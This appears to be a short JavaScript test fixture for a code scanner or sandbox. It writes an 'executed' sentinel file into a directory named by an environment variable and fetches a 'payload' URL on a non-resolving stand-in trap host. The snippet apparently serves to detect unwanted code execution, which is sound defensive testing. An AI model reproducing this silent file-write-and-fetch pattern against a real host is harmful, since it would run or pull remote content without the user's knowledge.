globalThis.process.getBuiltinModule("node:fs").writeFileSync(`${globalThis.process.env.SURVEYOR_SENTINEL_DIR}/payload`, "executed");
await fetch("http://trap.invalid/payload");
